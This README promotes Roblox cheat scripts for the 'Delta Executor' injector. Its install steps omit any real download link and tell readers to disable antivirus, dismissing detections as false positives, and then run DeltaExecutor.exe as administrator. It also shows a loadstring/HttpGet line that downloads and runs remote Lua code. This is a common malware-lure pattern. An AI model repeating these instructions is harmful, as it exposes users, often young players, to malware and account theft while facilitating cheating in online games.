# 🚀 Roblox Scripts Collection for Delta Executor (Windows)

> Optimized scripts for **Delta Executor** — Windows only (macOS/Linux coming soon).

<p align="center">
  <img src="https://img.shields.io/badge/Delta-Executor-blue?style=for-the-badge&logo=roblox">
  <img src="https://img.shields.io/badge/Platform-Windows-success?style=for-the-badge&logo=windows">
  <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge">
</p>

---

## 📖 About

This repo contains **10+ scripts** for popular Roblox games (AdoptMe, Rivals, War Tycoon, MM2, Blox Fruits, etc.). All scripts are tested with **Delta Executor** for stable performance on Windows 10/11.

---

## ✨ Features

- **Optimized for Delta** – fast and stable execution.
- **Weekly updates** – new scripts and fixes.
- **Easy to use** – copy-paste or load via URL.
- **Open source** – modify scripts as you like.

---

## 🛠️ Supported Executors & Platforms

| Executor   | Windows | macOS | Linux |
|------------|---------|-------|-------|
| **Delta**  | ✅      | 🔄    | 🔄    |
| Synapse X  | ✅      | ❌    | ❌    |
| Krnl       | ✅      | ✅*   | ❌    |
| Fluxus     | ✅      | ✅*   | ❌    |

> *via Wine/emulator. 🔄 = in development.

---

## 📦 Installing Delta Executor + scripts (Windows)

1. Download.
2. Extract the ZIP to any folder.
3. Temporarily disable antivirus (false positives are common).
4. Run `DeltaExecutor.exe` **as administrator**.
5. Click **Attach** and select the Roblox process.
6. Paste a script and hit **Execute**

## 🚀 How to Use a Script

Most scripts can be loaded directly using the following pattern:

```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/scripts/SCRIPT_NAME.lua"))()
